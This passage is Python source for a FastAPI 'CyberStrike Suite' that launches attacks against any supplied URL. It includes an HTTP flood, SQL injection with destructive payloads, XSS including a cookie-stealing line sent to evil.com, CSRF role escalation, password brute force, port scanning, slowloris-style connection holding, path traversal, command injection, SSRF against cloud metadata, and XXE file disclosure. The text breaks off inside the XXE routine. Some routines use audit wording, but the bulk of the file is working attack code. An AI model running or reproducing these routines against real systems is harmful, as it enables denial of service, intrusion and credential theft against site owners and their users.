import asyncio
import aiohttp
import random
import time
import hashlib
import string
import os
import re
import json
import uuid
import socket
import ssl
import dns.resolver
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from datetime import datetime
from fastapi import FastAPI, BackgroundTasks, HTTPException, WebSocket, WebSocketDisconnect, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
import uvicorn

app = FastAPI(title="CyberStrike Suite", version="1.0.0")

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Create static directory
os.makedirs("static", exist_ok=True)

# Serve static files
app.mount("/static", StaticFiles(directory="static"), name="static")

class AttackRequest(BaseModel):
    url: str
    attack_type: str
    duration: int = 30
    intensity: int = 5
    threads: int = 10
    target_port: Optional[int] = None
    username: Optional[str] = None
    wordlist: Optional[str] = None
    custom_header_payload: Optional[str] = None
    custom_xss_payload: Optional[str] = None

class AttackResponse(BaseModel):
    success: bool
    message: str
    attack_id: Optional[str] = None

# Global metrics & synchronization lock
MAX_TIME_SAMPLES = 1000
MAX_VULN_ENTRIES = 500

class SecureMetrics(dict):
    def __init__(self) -> None:
        super().__init__()
        self.lock = asyncio.Lock()
        self["total_requests"] = 0
        self["successful_requests"] = 0
        self["failed_requests"] = 0
        self["start_time"] = None
        self["attacks_running"] = False
        self["current_attacks"] = []
        self["response_times"] = []
        self["request_history"] = []
        self["vulnerabilities_found"] = []
        self["attack_history"] = []
        self["system_status"] = "ready"

metrics = SecureMetrics()
metrics_lock = metrics.lock

async def record_request_metric(success: bool, req_time: Optional[float] = None, status_code: Optional[int] = None):
    async with metrics.lock:
        metrics["total_requests"] += 1
        if success:
            metrics["successful_requests"] += 1
        else:
            metrics["failed_requests"] += 1
        if req_time is not None:
            metrics["response_times"].append(req_time)
            if len(metrics["response_times"]) > MAX_TIME_SAMPLES:
                del metrics["response_times"][:-MAX_TIME_SAMPLES]
        if status_code is not None and req_time is not None:
            metrics["request_history"].append({"time": time.time(), "status": status_code, "response_time": req_time})
            if len(metrics["request_history"]) > MAX_TIME_SAMPLES:
                del metrics["request_history"][:-MAX_TIME_SAMPLES]

async def record_vulnerability(vuln: Dict[str, Any]) -> bool:
    async with metrics.lock:
        dedup_key = (vuln.get("type"), vuln.get("url"), vuln.get("payload"))
        for existing in metrics["vulnerabilities_found"]:
            if (existing.get("type"), existing.get("url"), existing.get("payload")) == dedup_key:
                return False
        metrics["vulnerabilities_found"].append(vuln)
        if len(metrics["vulnerabilities_found"]) > MAX_VULN_ENTRIES:
            del metrics["vulnerabilities_found"][:-MAX_VULN_ENTRIES]
        return True

# ── Hardcoded self-test target ─────────────────────────────────────────


# WebSocket connection manager
class ConnectionManager:
    def __init__(self) -> None:
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        if websocket in self.active_connections:
            try:
                self.active_connections.remove(websocket)
            except ValueError:
                pass

    async def send_personal_message(self, message: str, websocket: WebSocket) -> None:
        try:
            await websocket.send_text(message)
        except Exception:
            self.disconnect(websocket)

    async def broadcast(self, message: str) -> None:
        dead = []
        for connection in list(self.active_connections):
            try:
                await connection.send_text(message)
            except (BrokenPipeError, Exception):
                dead.append(connection)
        for d in dead:
            self.disconnect(d)

    async def broadcast_json(self, data_type: str, payload_data: Optional[Dict[str, Any]] = None) -> None:
        msg_payload: Dict[str, Any] = {"type": data_type}
        if payload_data is not None:
            msg_payload["data"] = payload_data
        await self.broadcast(json.dumps(msg_payload))

manager = ConnectionManager()

# Attack functions
async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    timeout_cfg = aiohttp.ClientTimeout(total=2.5, sock_connect=1.5, sock_read=2.0)
    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    finding_logged = False
    ok_count = 0
    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
        start_time = time.time()
        tasks = []
        
        async def send_request():
            nonlocal finding_logged, ok_count
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    headers = {
                        "User-Agent": random.choice([
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                        ]),
                        "X-CyberStrike-Module": "ddos"
                    }
                    
                    req_start = time.time()
                    async with session.get(url, headers=headers) as response:
                        req_time = time.time() - req_start
                        await record_request_metric(True, req_time, response.status)
                        if response.status < 400:
                            ok_count += 1
                            if not finding_logged and ok_count >= 10:
                                finding_logged = True
                                await _broadcast_finding({
                                    "type": "Unthrottled HTTP Flood / Missing Rate Limit (DDoS)",
                                    "severity": "Medium",
                                    "url": url,
                                    "payload": f"Concurrent Multi-Worker HTTP GET Flood ({threads} workers)",
                                    "detail": "Target processed sustained high-concurrency HTTP flood traffic without enforcing HTTP 429 Too Many Requests or connection throttling.",
                                    "evidence": f"HTTP {response.status} | {ok_count}+ unthrottled flood requests | RTT: {req_time*1000:.1f} ms",
                                    "timestamp": datetime.now().isoformat(),
                                    "attack_id": attack_id
                                })
                        
                        await manager.broadcast(json.dumps({
                            "type": "metrics",
                            "data": {
                                "total_requests": metrics["total_requests"],
                                "successful_requests": metrics["successful_requests"],
                                "failed_requests": metrics["failed_requests"],
                                "response_time": req_time,
                                "current_attack": "DDoS",
                                "attack_id": attack_id
                            }
                        }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        jitter = random.uniform(0.0, min(0.005, sleep_delay * 0.1))
                        await asyncio.sleep(sleep_delay + jitter)
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.02 + random.uniform(0.005, 0.03))
        
        for _ in range(threads):
            task = asyncio.create_task(send_request())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def sql_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1#",
        "admin'--",
        "' OR 'x'='x",
        "1' OR '1'='1' /*",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--"
    ]
    sql_error_signatures = [
        "sql syntax", "mysql_fetch", "ora-0", "microsoft odbc",
        "sqlite3.operationalerror", "unclosed quotation mark",
        "unterminated quoted string", "pg_query()", "syntax error at or near"
    ]
    data_leak_signatures = [
        "information_schema", "admin@testme.local", "password_hash",
        "sqlite_master", "union select"
    ]
    
    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        start_time = time.time()
        base = url.rstrip('/')
        baseline_text = ""
        baseline_len = 0
        try:
            async with session.get(f"{base}/api/products?id=1", headers={"X-CyberStrike-Baseline": "true"}) as base_resp:
                baseline_text = (await base_resp.text()).lower()
                baseline_len = len(baseline_text)
        except Exception:
            pass

        tasks = []
        
        async def send_payload():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    payload = random.choice(payloads)
                    test_url = f"{base}/api/products?id={payload}"
                    
                    req_start = time.time()
                    async with session.get(test_url) as response:
                        req_time = time.time() - req_start
                        text = await response.text()
                        text_lower = text.lower()
                        await record_request_metric(True, req_time, response.status)
                        
                        matched_err = next((err for err in sql_error_signatures if err in text_lower and err not in baseline_text), None)
                        matched_leak = next((lk for lk in data_leak_signatures if lk in text_lower and lk not in baseline_text), None)
                        boolean_bypass = (
                            response.status == 200
                            and ("1=1" in payload or "'1'='1" in payload)
                            and baseline_len > 0
                            and len(text_lower) > baseline_len * 1.35
                        )
                        
                        if matched_err or matched_leak or boolean_bypass:
                            evidence = matched_err or matched_leak or f"Response size expanded ({len(text_lower)}B vs {baseline_len}B baseline)"
                            vuln = {
                                "type": "SQL Injection",
                                "url": test_url,
                                "payload": payload,
                                "evidence": evidence,
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            }
                            if await record_vulnerability(vuln):
                                await manager.broadcast(json.dumps({
                                    "type": "vulnerability",
                                    "data": vuln
                                }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
        
        for _ in range(threads):
            task = asyncio.create_task(send_payload())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

def _is_unescaped_xss_reflected(payload: str, body: str, content_type: str) -> bool:
    """Verify the XSS payload is reflected unescaped in an executable HTML/DOM context."""
    ctype = (content_type or "").lower()
    if "application/json" in ctype or "text/plain" in ctype:
        return False
    if payload not in body:
        return False
    # Ensure angle brackets or event handlers are present unescaped (not HTML entity encoded)
    active_Execution_tokens = ("<script", "onerror=", "onload=", "onfocus=", "<svg", "<iframe", "<img", "javascript:")
    return any(tok in payload.lower() and tok in body.lower() for tok in active_Execution_tokens)

async def xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: Optional[str] = None):
    payloads = [
        "<img src=x onerror=alert(1)>",
        "<script>alert('XSS')</script>",
        "<body onload=alert(1)>",
        "';alert(1);//",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "javascript:alert(1)",
        "<script>document.location='http://evil.com/?'+document.cookie</script>"
    ]
    if custom_xss_payload:
        p = custom_xss_payload
        if '<' not in p and '>' not in p:
            payloads.append(f"<script>alert('{p}')</script>")
        else:
            payloads.append(p)
            
    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        start_time = time.time()
        tasks = []
        
        async def send_payload():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    payload = random.choice(payloads)
                    base = url.rstrip('/')
                    test_url = f"{base}/search?q={payload}"
                    
                    req_start = time.time()
                    async with session.get(test_url) as response:
                        req_time = time.time() - req_start
                        text = await response.text()
                        content_type = response.headers.get("Content-Type", "text/html")
                        await record_request_metric(True, req_time, response.status)
                        
                        if _is_unescaped_xss_reflected(payload, text, content_type):
                            vuln = {
                                "type": "XSS",
                                "url": test_url,
                                "payload": payload,
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            }
                            if await record_vulnerability(vuln):
                                await manager.broadcast(json.dumps({
                                    "type": "vulnerability",
                                    "data": vuln
                                }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
        
        for _ in range(threads):
            task = asyncio.create_task(send_payload())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def stored_xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: str = None):
    unique_marker = f"cstrike_stored_{int(time.time())}"
    payload = custom_xss_payload if custom_xss_payload else f"<script>alert('{unique_marker}')</script>"
    base = url.rstrip('/')
    post_url = f"{base}/api/comments"
    get_url  = f"{base}/api/comments"

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        while time.time() - start_time < duration and metrics["attacks_running"]:
            try:
                t_post = time.time()
                async with session.post(
                    post_url,
                    json={"comment": payload},
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as post_resp:
                    await record_request_metric(post_resp.status < 500, time.time() - t_post, post_resp.status)

                t_get = time.time()
                async with session.get(get_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    req_time = time.time() - t_get
                    text = await response.text()
                    await record_request_metric(response.status < 500, req_time, response.status)

                    if payload in text:
                        await _broadcast_finding({
                            "type": "Stored XSS",
                            "severity": "Critical",
                            "url": get_url,
                            "payload": payload,
                            "detail": "Injected script canary persisted via POST and rendered unescaped on subsequent GET retrieval.",
                            "evidence": f"HTTP {response.status} — Persisted canary verified in /api/comments response body",
                            "timestamp": datetime.now().isoformat(),
                            "attack_id": attack_id
                        })
                        await manager.broadcast(json.dumps({
                            "type": "log",
                            "message": f"[Stored XSS] Persistent script reflection verified at {get_url}",
                            "level": "error"
                        }))
                        break

                await asyncio.sleep(1.0 / max(intensity, 1))
            except Exception:
                await record_request_metric(False)
                await asyncio.sleep(0.5)


async def csrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        tasks = []

        async def send_request():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    base = url.rstrip('/')
                    test_url = f"{base}/api/update-profile"
                    data = {"action": "update", "role": "admin", "email": "audit@external.invalid"}
                    headers = {
                        "Origin": "https://external-origin.invalid",
                        "Referer": "https://external-origin.invalid/csrf-poc.html"
                    }
                    req_start = time.time()
                    async with session.post(
                        test_url,
                        data=data,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        req_time = time.time() - req_start
                        body = await response.text()
                        await record_request_metric(response.status < 500, req_time, response.status)

                        if response.status == 200:
                            await _broadcast_finding({
                                "type": "Missing CSRF Protection",
                                "severity": "High",
                                "url": test_url,
                                "payload": "Cross-Origin POST (Origin: https://external-origin.invalid, No Anti-CSRF Token)",
                                "detail": "State-changing POST endpoint accepted a forged cross-origin form submission without validating an Anti-CSRF token or Origin header.",
                                "evidence": f"HTTP {response.status} | Response: {body[:140]}",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                    await asyncio.sleep(1.0 / max(intensity, 1))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.5)

        for _ in range(min(max(threads, 1), 20)):
            tasks.append(asyncio.create_task(send_request()))

        await asyncio.gather(*tasks)


async def brute_force_attack(url: str, duration: int, intensity: int, threads: int, username: str, wordlist_file: Optional[str], attack_id: str):
    passwords = ["123456", "password", "admin", "12345", "12345678", "qwerty", "secret", "guest", "root", "oracle"]
    if wordlist_file and os.path.exists(wordlist_file):
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()][:100]
        except Exception:
            pass

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        tasks = []
        rate_limited = False
        attempts_sent = 0

        async def try_login():
            nonlocal rate_limited, attempts_sent
            p_idx = 0
            target_user = username or "admin"
            base = url.rstrip('/')
            test_url = f"{base}/login" if '/login' not in url else url

            while time.time() - start_time < duration and metrics["attacks_running"] and p_idx < len(passwords):
                try:
                    password = passwords[p_idx]
                    p_idx += 1
                    req_start = time.time()
                    async with session.post(
                        test_url,
                        data=f"username={target_user}&password={password}",
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=aiohttp.ClientTimeout(total=4)
                    ) as response:
                        req_time = time.time() - req_start
                        attempts_sent += 1
                        text = await response.text()

                        if response.status == 429:
                            rate_limited = True
                            await record_request_metric(False, req_time, response.status)
                        else:
                            await record_request_metric(response.status < 500, req_time, response.status)

                        if response.status == 200 and any(k in text.lower() for k in ("token", "success", "dashboard", "welcome")):
                            await _broadcast_finding({
                                "type": "Weak Credentials Accepted",
                                "severity": "Critical",
                                "url": test_url,
                                "payload": f"username={target_user} | password={password}",
                                "detail": f"Authentication endpoint accepted weak credential pair ({target_user}:{password}) without MFA or lockout.",
                                "evidence": f"HTTP 200 | Response snippet: {text[:140]}",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })

                    await asyncio.sleep(1.0 / max(intensity, 1))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.5)

        for _ in range(min(max(threads, 1), 15)):
            tasks.append(asyncio.create_task(try_login()))

        await asyncio.gather(*tasks)

        if attempts_sent >= 8 and not rate_limited:
            base = url.rstrip('/')
            test_url = f"{base}/login" if '/login' not in url else url
            await _broadcast_finding({
                "type": "Missing Authentication Rate Limiting",
                "severity": "Medium",
                "url": test_url,
                "payload": f"{attempts_sent} rapid credential probes without HTTP 429 lockout",
                "detail": f"Authentication endpoint processed {attempts_sent} rapid login attempts without enforcing HTTP 429 Too Many Requests or account lockout.",
                "evidence": f"{attempts_sent} consecutive POST probes completed with 0 rate-limit blocks",
                "timestamp": datetime.now().isoformat(),
                "attack_id": attack_id
            })


async def port_scan_attack(url: str, duration: int, intensity: int, target_port: Optional[int], attack_id: str):
    host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    SERVICE_MAP = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 1433: "MSSQL", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 6379: "Redis", 8000: "HTTP-Alt", 8080: "HTTP-Proxy",
        8081: "CyberStrike-Node", 8082: "CyberStrike-Engine", 8083: "Honeypot-HTTP",
        8443: "HTTPS-Alt", 9000: "Service-API"
    }
    ports = [target_port] if target_port else list(SERVICE_MAP.keys())
    start_time = time.time()

    async def scan_port(port: int):
        if not metrics["attacks_running"]:
            return
        req_start = time.time()
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=1.5)
            req_time = time.time() - req_start
            banner = ""
            try:
                writer.write(b"HEAD / HTTP/1.0\r\n\r\n")
                await asyncio.wait_for(writer.drain(), timeout=0.6)
                raw_banner = await asyncio.wait_for(reader.read(128), timeout=0.6)
                banner = raw_banner.decode("utf-8", errors="ignore").split("\r\n")[0].strip()
            except Exception:
                pass
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            await record_request_metric(True, req_time, 200)
            svc = SERVICE_MAP.get(port, "TCP-Service")
            await _broadcast_finding({
                "type": f"Exposed Network Service ({svc})",
                "severity": "High" if port in (21, 23, 445, 1433, 3306, 3389, 5432, 6379) else "Info",
                "url": f"{host}:{port}",
                "payload": f"TCP SYN/Connect Probe -> Port {port} ({svc})",
                "detail": f"TCP port {port} ({svc}) is reachable on {host} (handshake RTT: {req_time*1000:.1f} ms).",
                "evidence": f"Port {port}/tcp OPEN | Service: {svc}" + (f" | Banner: {banner[:80]}" if banner else ""),
                "timestamp": datetime.now().isoformat(),
                "attack_id": attack_id
            })
            await manager.broadcast(json.dumps({
                "type": "log",
                "message": f"[Port Scan] {host}:{port} ({svc}) -> OPEN ({req_time*1000:.1f} ms)",
                "level": "warning"
            }))
        except Exception:
            await record_request_metric(False)

    for port in ports:
        if time.time() - start_time >= duration or not metrics["attacks_running"]:
            break
        await scan_port(port)
        await asyncio.sleep(0.35 / max(intensity, 1))


# ── New Attack Functions ─────────────────────────────────────────────

async def slowloris_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Keep-Alive & Header Read-Timeout Posture Verification (non-blocking asyncio)."""
    base_url = format_url(url)
    host_port = re.sub(r'^https?://', '', base_url.strip()).split('/')[0]
    host = host_port.split(':')[0]
    port = int(host_port.split(':')[1]) if ':' in host_port and host_port.split(':')[1].isdigit() else (443 if base_url.startswith('https') else 80)
    use_ssl = base_url.startswith('https') or port == 443

    # 1. Inspect HTTP Keep-Alive & Server Timeout Headers
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.get(
                base_url,
                headers={"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"},
                timeout=aiohttp.ClientTimeout(total=6)
            ) as resp:
                elapsed = time.time() - t0
                await record_request_metric(resp.status < 500, elapsed, resp.status)
                hdrs = {k.lower(): v for k, v in resp.headers.items()}
                conn_val = hdrs.get("connection", "")
                ka_val   = hdrs.get("keep-alive", "")
                if "timeout=" not in ka_val.lower() and "close" not in conn_val.lower():
                    await _broadcast_finding({
                        "type": "Unbounded Keep-Alive / Missing Timeout Header",
                        "severity": "Medium",
                        "url": base_url,
                        "payload": "Connection: keep-alive (No Keep-Alive timeout directive)",
                        "detail": "Server accepts persistent Keep-Alive connections without advertising an explicit timeout bound in the Keep-Alive response header.",
                        "evidence": f"HTTP {resp.status} | Connection: {conn_val or 'default (keep-alive)'} | Keep-Alive: {ka_val or 'absent'}",
                        "timestamp": datetime.now().isoformat(),
                        "attack_id": attack_id,
                        "category": "availability-posture"
                    })
    except Exception:
        await record_request_metric(False)

    # 2. Bounded non-blocking partial-header hold verification
    start_time = time.time()
    streams = []
    max_verify_streams = min(max(threads, 1), 15)
    finding_logged = False

    while time.time() - start_time < duration and metrics['attacks_running']:
        if len(streams) < max_verify_streams:
            try:
                t_conn = time.time()
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=(ssl.create_default_context() if use_ssl else None)),
                    timeout=3.5
                )
                req_line = f"GET /?verify={random.randint(1000,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: CyberStrike-Audit/1.0\r\n"
                writer.write(req_line.encode())
                await asyncio.wait_for(writer.drain(), timeout=2.0)
                conn_latency = time.time() - t_conn

                streams.append((reader, writer, time.time()))
                await record_request_metric(True, conn_latency, 200)
                await manager.broadcast(json.dumps({
                    'type': 'log',
                    'message': f'[Keep-Alive Audit] Stream #{len(streams)}/{max_verify_streams} held open to {host}:{port} ({conn_latency*1000:.1f} ms)',
                    'level': 'warning'
                }))
            except Exception:
                await record_request_metric(False)

        active_streams = []
        for rdr, wrt, opened_at in streams:
            try:
                t_ping = time.time()
                wrt.write(f"X-KeepAlive-Check: {random.randint(10000,99999)}\r\n".encode())
                await asyncio.wait_for(wrt.drain(), timeout=1.5)
                ping_rt = time.time() - t_ping
                await record_request_metric(True, ping_rt, 200)
                active_streams.append((rdr, wrt, opened_at))

                held_sec = time.time() - opened_at
                if held_sec >= 6.0 and not finding_logged:
                    finding_logged = True
                    await _broadcast_finding({
                        "type": "Slow Header Read Timeout Not Enforced",
                        "severity": "High",
                        "url": f"{host}:{port}",
                        "payload": "Incomplete HTTP/1.1 header stream held > 6.0s",
                        "detail": f"Target kept {len(streams)} incomplete HTTP header streams open for {held_sec:.1f}s without enforcing a strict client_header_timeout.",
                        "evidence": f"Host {host}:{port} accepted incremental X-KeepAlive-Check headers over {held_sec:.1f}s",
                        "timestamp": datetime.now().isoformat(),
                        "attack_id": attack_id,
                        "category": "timeout-posture"
                    })
            except Exception:
                try:
                    wrt.close()
                except Exception:
                    pass
        streams = active_streams
        await asyncio.sleep(max(1.0 / max(intensity, 1), 0.35))

    for _, wrt, _ in streams:
        try:
            wrt.close()
        except Exception:
            pass


async def traversal_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
        '../../../../etc/shadow', '../etc/passwd%00',
        '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd', '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '../../../../proc/self/environ'
    ]
    start_time = time.time()
    p_idx = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = payloads[p_idx % len(payloads)]
            p_idx += 1
            base = url.rstrip('/')
            test_url = f"{base}/api/file?path={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    await record_request_metric(resp.status < 500, elapsed, resp.status)
                    if any(sig in body for sig in ('root:', '[fonts]', '[extensions]', 'localhost')):
                        await _broadcast_finding({
                            'type': 'Directory Traversal / LFI',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical',
                            'detail': 'Unvalidated file path parameter allowed arbitrary traversal outside the web root.',
                            'evidence': body[:160],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        })
                        await manager.broadcast(json.dumps({
                            'type': 'log',
                            'message': f'[Traversal] File disclosure verified with payload: {payload}',
                            'level': 'error'
                        }))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def cmd_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        '; id', '| id', '& id', '`id`', '$(id)',
        '; cat /etc/passwd', '| whoami', '& whoami',
        '; ls -la', '| dir', '& dir',
        '; ping -c 1 127.0.0.1', '| ping -n 1 127.0.0.1'
    ]
    start_time = time.time()
    p_idx = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = payloads[p_idx % len(payloads)]
            p_idx += 1
            base = url.rstrip('/')
            test_url = f"{base}/api/ping?host=127.0.0.1{payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    await record_request_metric(resp.status < 500, elapsed, resp.status)
                    indicators = ['uid=', 'gid=', 'root:', 'Administrator', 'Directory of']
                    if any(ind in body for ind in indicators):
                        await _broadcast_finding({
                            'type': 'OS Command Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical',
                            'detail': 'Unsanitized shell metacharacters in query parameter executed an operating system command.',
                            'evidence': body[:160],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        })
                        await manager.broadcast(json.dumps({
                            'type': 'log',
                            'message': f'[Command Injection] OS command output verified with payload: {payload}',
                            'level': 'error'
                        }))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def ssrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        'http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/',
        'http://169.254.169.254/metadata/v1/',
        'http://127.0.0.1:22/', 'http://127.0.0.1:3306/',
        'http://127.0.0.1:6379/', 'http://127.0.0.1:5432/',
        'file:///etc/passwd', 'file:///C:/Windows/win.ini'
    ]
    start_time = time.time()
    p_idx = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = payloads[p_idx % len(payloads)]
            p_idx += 1
            base = url.rstrip('/')
            test_url = f"{base}/api/fetch?url={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    await record_request_metric(resp.status < 500, elapsed, resp.status)
                    ssrf_indicators = [
                        'ami-id', 'instance-id', 'local-ipv4', 'security-credentials',
                        'computeMetadata', 'root:', 'SSH-2.0', 'redis_version'
                    ]
                    if any(ind in body for ind in ssrf_indicators):
                        await _broadcast_finding({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical',
                            'detail': 'Backend URL fetcher accessed an internal loopback or cloud metadata resource without allowlist validation.',
                            'evidence': body[:160],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        })
                        await manager.broadcast(json.dumps({
                            'type': 'log',
                            'message': f'[SSRF] Internal metadata/resource response verified via {payload}',
                            'level': 'error'
                        }))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def xxe_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    ]
    start_time = time.time()
    p_idx = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = xxe_payloads[p_idx % len(xxe_payloads)]
            p_idx += 1
            t0 = time.time()
            base = url.rstrip('/')
            target_ep = f"{base}/api/xml"
            try:
                async with session.post(
                    target_ep,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=aiohttp.ClientTimeout(total=6)
                ) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    await record_request_metric(resp.status < 500, elapsed, resp.status)
                    if any(sig in body for sig in ('root:', '[fonts]', 'localhost')):
                        await _broadcast_finding({
                            'type': 'XML External Entity (XXE) Injection',
                            'url': target_ep,
                            'payload': payload[:90],
                            'severity': 'Critical',
                            'detail': 'XML parser resolved an external SYSTEM entity, disclosing local file contents in the response.',
                            'evidence': body[:160],
